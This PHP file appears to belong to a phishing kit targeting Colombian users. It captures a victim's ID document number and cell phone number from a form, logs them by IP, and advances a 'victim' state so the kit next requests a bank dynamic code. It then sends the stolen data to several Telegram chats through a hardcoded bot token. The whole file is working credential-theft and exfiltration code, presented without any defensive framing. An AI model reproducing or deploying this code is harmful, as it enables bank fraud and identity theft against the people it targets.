<?php
require('../panel/lib/funciones.php');
date_default_timezone_set('America/Bogota');

$ip = $_SERVER['REMOTE_ADDR'];
$documento = isset($_POST['doc']) ? $_POST['doc'] : '';
$celular = isset($_POST['cel']) ? $_POST['cel'] : '';

if (!empty($documento) && !empty($celular)) {
    // 1. Guardar en el panel local
    if (function_exists('traer_regitro') && function_exists('actualizar_registro_info')) {
        $registro = traer_regitro($ip);
        actualizar_registro_info($registro, $documento, $celular);
    }

    // --- CLAVE: Cambiar estado a "2" para que pida la DINÁMICA después de esto ---
    if (function_exists('actualizar_estado_victima')) {
        actualizar_estado_victima($ip, "2");
    }

    // 2. Configuración del Bot de 𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - (4 IDs activos)
    $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
    $chat_ids = [
        "8114050673", 
        "8518977918", 
        "8638340940", 
        
    ]; 

    // 3. Formato del mensaje
    $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - DATOS PERSONALES</b> ⭐\n\n";
    $mensaje .= "👤 <b>IP:</b> <code>" . $ip . "</code>\n";
    $mensaje .= "🪪 <b>DOCUMENTO:</b> <code>" . $documento . "</code>\n";
    $mensaje .= "📱 <b>CELULAR:</b> <code>" . $celular . "</code>\n";
    $mensaje .= "⏰ <b>FECHA:</b> " . date('d/m/Y H:i:s') . "\n";
    $mensaje .= "━━━━━━━━━━━━━━━";

    // 4. Envío a Telegram con CURL
    foreach ($chat_ids as $id) {
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
        $params = [
            'chat_id' => $id,
            'text' => $mensaje,
            'parse_mode' => 'HTML'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        
        curl_exec($ch);
        curl_close($ch);
    }
}
?>
